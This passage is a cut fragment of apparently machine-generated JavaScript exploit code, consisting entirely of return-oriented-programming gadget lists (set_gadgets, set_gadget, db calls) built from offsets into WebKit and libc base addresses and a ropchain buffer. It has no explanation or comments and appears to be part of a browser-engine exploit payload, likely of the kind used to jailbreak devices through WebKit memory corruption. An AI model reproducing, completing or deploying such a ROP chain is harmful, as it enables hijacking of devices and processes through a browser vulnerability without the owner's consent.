webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+351952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351968, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+352072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+352056, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965152, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965152, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+352232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+352248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+352400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+352432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+352416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+352384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+352536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+352520, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965144, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+352608, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+352824, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+352960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+352976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+352944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+353072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+353056, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+353168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+353248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+353304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+353384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+353488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+353504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+353656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+353688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+353672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+353640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+353848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+353816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+353800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+353920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+353936, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+354024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+354080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+354152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+354208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+354312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+354400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+354504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+354520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+354672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+354704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+354688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+354656, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+354800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+354784, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+354904, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+194528, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397992, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+355080, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+398016, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+355224, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965120, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+355352, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+355408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+355456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965120, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+355560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+355576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+355728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+355760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+355744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+355712, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+355832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+355848, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+355944, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+355928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+356024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+356176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+356160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+356360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+356344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+356480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+356496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+356640, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+356632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+356656, 
ropchain+356672, 
libc_base+811575, 
ropchain+356688, 
libc_base+811575, 
ropchain+359920, 
libc_base+759626, 
libc_base+793877, 
ropchain+356744, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+356824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+356880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+356960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965120, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+357064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+357232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+357216, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+357384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+357368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+357488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+357544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+357664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357680, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+357856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+357824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+357912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+358264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+358616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+359016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+359000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398040, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+359168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+359240, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965120, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+359344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+359360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+359512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+359544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+359528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+359496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+359640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+359624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+359728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+359784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965120, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+359864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+355416, 
libc_base+788575, 
ropchain+398048, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+360032, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+360160, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+360216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+360264, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+360368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+360384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+360536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+360568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+360552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+360520, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+360640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+360656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+360752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+360736, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+360832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+360984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+360968, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+361168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+361152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+361288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+361304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+361448, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+361440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+361464, 
ropchain+361480, 
libc_base+811575, 
ropchain+361496, 
libc_base+811575, 
ropchain+365888, 
libc_base+759626, 
libc_base+793877, 
ropchain+361552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+361632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+361688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+361768, 
webkit_base+7438103, 
